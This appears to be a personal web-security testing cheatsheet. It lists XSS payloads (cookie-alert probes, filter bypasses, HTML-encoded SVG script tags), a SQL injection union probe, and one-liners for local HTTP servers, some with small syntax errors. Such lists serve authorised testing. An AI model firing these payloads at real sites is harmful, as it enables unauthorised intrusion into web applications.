# d15rup7or cheatsheet

## Table of contents
* ![WebApps](#webapps)
  * ![XSS](#XSS)
  * ![SQL Injection](sql-injection)
* ![Useful commands](#useful-commands)
  * ![HTTP Server]()


## WebApps[⤴](#table-of-contents)

### XSS
All purpose
```
"><script>alert(document.cookie)</script>
"><script>alert(1)</script>
'; alert(1); var foo='
javascript:alert(1);
<scr<script>ipt>alert(1)</script>
```
### SQL Injection
`' union select null, null, null, null;--`

SVG script with HTML encoding
```
<svg><script>&#97;lert(1)</script></svg>
<svg><script>&#x61;lert(1)</script></svg>
<svg><script>alert&NewLine;(1)</script></svg>
<svg><script>x="&quot;,alert(1)//";</script></svg>
```

## Useful commands[⤴](#table-of-contents)
### HTTP Server
#### Python
```
python2 -m SimpleHTTPServer -p
python3 -m http.server
```
#### Ruby
```
ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 8888, :DocumentRoot => Dir.pwd).start”
```
#### PHP
```
php -S 0.0.0.0:8888
```
